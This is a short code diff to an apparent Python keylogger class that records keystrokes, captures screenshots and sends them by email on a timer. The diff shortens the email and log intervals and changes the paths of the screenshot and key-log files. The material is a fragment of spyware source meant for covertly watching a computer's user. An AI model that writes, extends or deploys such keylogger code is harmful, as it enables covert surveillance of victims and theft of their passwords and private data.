@@ -14,11 +14,11 @@ class KeyLogger:
     mem: string buffer to minimize logging writeouts
     start_time: time of the current logging cycle
     """
-    def __init__(self, mail, email_st=120, log_ft=20, log_dir=""):
+    def __init__(self, mail, email_st=12, log_ft=10, log_dir=""):
         # email obj
         self.email = mail
         self.camera = Camera()
-        self.imgage_name = "../screen.png"
+        self.imgage_name = "screen.png"
 
         # times for last updates
         self.start_time = time.time()
@@ -28,7 +28,7 @@ class KeyLogger:
 
         # buffer and logging config
         self.mem = []
-        self.filename = "../key_log.txt"
+        self.filename = "key_log.txt"
         logging.basicConfig(
             filename=(log_dir + self.filename), 
             level=logging.INFO, 
